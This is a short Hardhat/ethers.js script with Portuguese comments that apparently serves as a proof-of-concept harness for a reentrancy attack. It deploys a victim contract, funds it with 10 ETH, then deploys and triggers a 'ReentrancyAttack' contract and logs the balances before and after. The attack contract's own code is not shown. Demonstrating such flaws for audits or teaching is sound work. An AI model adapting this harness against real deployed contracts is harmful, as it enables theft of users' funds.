/* Re-deploy do contrato do cliente */
const [deployer, attackerEOA] = await ethers.getSigners();

const Victim = await ethers.getContractFactory("ReentrancyVictim");

const victim = await Victim.deploy();

await victim.waitForDeployment();

const victimAddr = victim.target || victim.address;

console.log("Victim:", victimAddr);

const txDep = await victim.connect(deployer).deposit({ value: ethers.parseEther("10") });

await txDep.wait();

console.log("Deposit tx:", txDep.hash);


console.log("Victim balance after deposit:", ethers.formatEther(await ethers.provider.getBalance(victimAddr)));

/* Deploy do Attacker e exploitation */
const Att = await ethers.getContractFactory("ReentrancyAttack");

const attacker = await Att.connect(attackerEOA).deploy(victimAddr);

const attackerAddr = attacker.target || attacker.address;

console.log("Attacker:", attackerAddr);

console.log("Before - Victim:", ethers.formatEther(await ethers.provider.getBalance(victimAddr)));

console.log("Before - Attacker Contract:", ethers.formatEther(await ethers.provider.getBalance(attackerAddr)));

const attackTx = await attacker.connect(attackerEOA).attack({ value: ethers.parseEther("1") });

console.log("Attack tx sent:", attackTx.hash);

const receipt = await attackTx.wait();

console.log("Attack receipt status:", receipt.status, "gasUsed:", receipt.gasUsed.toString());

console.log("After - Victim:", ethers.formatEther(await ethers.provider.getBalance(victimAddr)));

console.log("After - Attacker Contract:", ethers.formatEther(await ethers.provider.getBalance(attackerAddr)));

console.log("After - Attacker EOA:", ethers.formatEther(await ethers.provider.getBalance(attackerEOA.address)));
